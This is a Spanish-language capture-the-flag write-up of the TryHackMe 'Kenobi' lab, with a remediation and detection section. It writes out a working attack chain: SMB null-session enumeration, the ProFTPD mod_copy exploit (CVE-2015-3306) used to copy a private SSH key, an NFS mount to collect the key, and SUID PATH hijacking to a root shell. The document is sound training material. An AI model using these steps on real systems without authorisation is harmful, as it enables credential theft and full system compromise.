# TryHackMe — Kenobi

**Dificultad:** Easy · **SO:** Linux (Ubuntu) · **Vectores:** SMB null session, ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306), NFS export sin restricción, PATH hijacking sobre binario SUID

---

## Resumen ejecutivo

Kenobi es una máquina Linux que encadena tres fallos de control de acceso en tres servicios de red distintos (Samba, ProFTPD, NFS) para lograr acceso inicial sin ninguna credencial, y una escalada de privilegios por manipulación de la variable de entorno `PATH` contra un binario con permiso SUID mal implementado. El resultado final es ejecución de comandos como root partiendo de cero información previa sobre el sistema.

## Reconocimiento

```
nmap -p- --min-rate 5000 -sV -sC <IP>
```

| Puerto | Servicio | Detalle |
|---|---|---|
| 21 | FTP | ProFTPD 1.3.5 |
| 22 | SSH | OpenSSH |
| 80 | HTTP | — |
| 111 / 2049 | RPC / NFS | export detectado |
| 139 / 445 | SMB | Samba (Ubuntu) |

Hostname: `KENOBI`.

## Fase 1 — Enumeración SMB y leak de información

```
smbclient -L //<IP> -N
```

El flag `-N` fuerza una conexión con **null session** (sin usuario ni contraseña). El servidor respondió sin exigir autenticación, listando tres shares: `print$`, `anonymous`, `IPC$`.

Esto es en sí mismo un hallazgo de seguridad: permitir enumeración anónima de shares expone la superficie de ataque del servidor a cualquier persona con acceso de red, sin necesidad de romper ni robar ninguna credencial.

Conectando al share `anonymous`:

```
smbclient //<IP>/anonymous -N
```

Dentro había un fichero `log.txt` — el output completo de un `ssh-keygen` ejecutado en el servidor, generando un par de claves RSA para el usuario **kenobi**, sin passphrase:

```
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
```

Ese log nunca debería haber quedado expuesto en un recurso compartido accesible sin autenticación — es la pieza de información que hace posible el resto de la cadena.

## Fase 2 — Explotación de ProFTPD 1.3.5 (mod_copy)

Verificación de versión leyendo el banner del servicio:

```
nc <IP> 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
```

Búsqueda de exploits públicos:

```
searchsploit proftpd 1.3.5
```

Resultado relevante: **ProFTPD 1.3.5 — File Copy** (mod_copy). El módulo `mod_copy` implementa los comandos no estándar `SITE CPFR` (Copy From) y `SITE CPTO` (Copy To), que permiten copiar ficheros dentro del sistema de ficheros del servidor. El fallo es que **no valida si el cliente está autenticado** antes de ejecutar la operación — cualquier cliente FTP anónimo puede usarlos para copiar cualquier fichero al que el proceso ProFTPD tenga acceso de lectura, sin restringirse al directorio FTP público. Es una vulnerabilidad de control de acceso roto (CVE-2015-3306).

Explotación vía netcat, conectando en texto plano al puerto 21:

```
nc <IP> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

`/var/tmp` se eligió como destino por dos motivos: `/tmp` tiene permisos de escritura abiertos para cualquier usuario (sticky bit, 1777), y `/var` era el directorio que la enumeración NFS inicial mostraba como exportado por el servidor.

## Fase 3 — Recogida vía NFS

NFS permite montar un directorio remoto como si fuera local. El servidor exportaba `/var` sin restricción de IPs de origen:

```
sudo mkdir /mnt/kenobiNFS
sudo mount -t nfs <IP>:/var /mnt/kenobiNFS
```

Dentro de `/mnt/kenobiNFS/tmp/` apareció la copia de la clave privada. Se trasladó a un sitio permanente y se ajustaron permisos (obligatorio para que SSH acepte usarla):

```
cp /mnt/kenobiNFS/tmp/id_rsa ~/id_rsa_kenobi
chmod 600 ~/id_rsa_kenobi
```

## Fase 4 — Acceso inicial vía SSH

```
ssh -i ~/id_rsa_kenobi kenobi@<IP>
```

Acceso como `kenobi` mediante autenticación por clave pública, sin contraseña ni passphrase.

**Flag de usuario:** `/home/kenobi/user.txt`

## Fase 5 — Escalada de privilegios (SUID + PATH hijacking)

Búsqueda de binarios con el bit SUID activo:

```
find / -perm -4000 -type f 2>/dev/null
```

Entre los binarios estándar del sistema apareció uno anómalo: `/usr/bin/menu` — un menú interactivo custom, no perteneciente a ningún paquete estándar de Ubuntu, con tres opciones (status check, kernel version, ifconfig).

Al probar la opción de `ifconfig`, se confirmó que el binario invoca internamente el comando `ifconfig` **sin especificar su ruta absoluta** (`/sbin/ifconfig`), confiando en que el sistema lo localice a través de la variable de entorno `PATH` del usuario que lo ejecuta.

**Explotación:**

```bash
# 1. Script malicioso con el mismo nombre que el binario legítimo
echo -e '#!/bin/bash\n/bin/bash' > /home/kenobi/ifconfig
chmod +x /home/kenobi/ifconfig

# 2. Anteponer el directorio propio al PATH
export PATH=/home/kenobi:$PATH

# 3. Ejecutar el binario SUID y elegir la opción vulnerable
/usr/bin/menu
# → opción 3 (ifconfig)
```

Como `/usr/bin/menu` tiene el bit **SUID** activo (propietario root), se ejecuta siempre con privilegios de root, sin importar qué usuario lo lance. Al buscar `ifconfig`, el sistema recorre el `PATH` en orden y encuentra primero el script falso en `/home/kenobi` — que se ejecuta con los privilegios heredados de `menu` (root). El script lanza `/bin/bash`, obteniendo una shell interactiva con privilegios de root.

**Flag de root:** `/root/root.txt`

---

## Causa raíz

Los tres servicios implicados (Samba, ProFTPD, NFS) exponían operaciones sensibles — listar/leer recursos compartidos, copiar ficheros arbitrarios del sistema, montar un directorio completo del servidor — **sin exigir autenticación previa**. Es el mismo patrón de control de acceso roto repetido en tres capas de red distintas de la misma máquina, lo que convirtió tres fallos de gravedad individual moderada en una cadena de compromiso total.

## Remediación

| Servicio | Recomendación |
|---|---|
| **SMB** | Deshabilitar el guest access / null session en `smb.conf`, forzando autenticación real para listar o acceder a cualquier share. |
| **ProFTPD** | Mantener el FTP anónimo solo si es necesario para descargas públicas, pero deshabilitar específicamente el módulo `mod_copy`, o actualizar a una versión donde `SITE CPFR`/`CPTO` exija autenticación. No deshabilitar el servicio anónimo entero si no hace falta — el fallo está en una funcionalidad concreta, no en el servicio. |
| **NFS** | En `/etc/exports`, restringir el export de `/var` a IPs o rangos concretos autorizados en vez de dejarlo abierto por defecto. |
| **Binario `menu`** | Usar rutas absolutas (`/sbin/ifconfig`) en el código en vez de depender del `PATH` del usuario que lo ejecuta. Adicionalmente, aplicar el principio de mínimo privilegio: revisar si el binario realmente necesita el bit SUID para su función, y retirarlo si no es imprescindible. |

## Detección

- **Logs de ProFTPD:** un cliente anónimo (sin autenticar) ejecutando `SITE CPFR`/`SITE CPTO` contra rutas fuera del árbol de directorios del propio servicio FTP (p. ej. `/home/kenobi/.ssh/`) es una señal clara de abuso de funcionalidad — un uso anónimo legítimo solo debería generar `LIST`, `RETR`, `STOR` dentro del directorio público.
- **Logs de autenticación SSH (`/var/log/auth.log`):** autenticación por clave pública en una cuenta donde no consta haberse distribuido esa clave a ningún usuario legítimo es una señal de alerta, especialmente si es el primer uso de ese método de autenticación para esa cuenta.
- **Auditoría de ficheros (auditd/AIDE):** la creación de un fichero ejecutable con el mismo nombre que un binario del sistema (`ifconfig`) en el home de un usuario, seguida de una modificación de `PATH` y la ejecución inmediata de un binario SUID, es un patrón detectable de PATH hijacking.
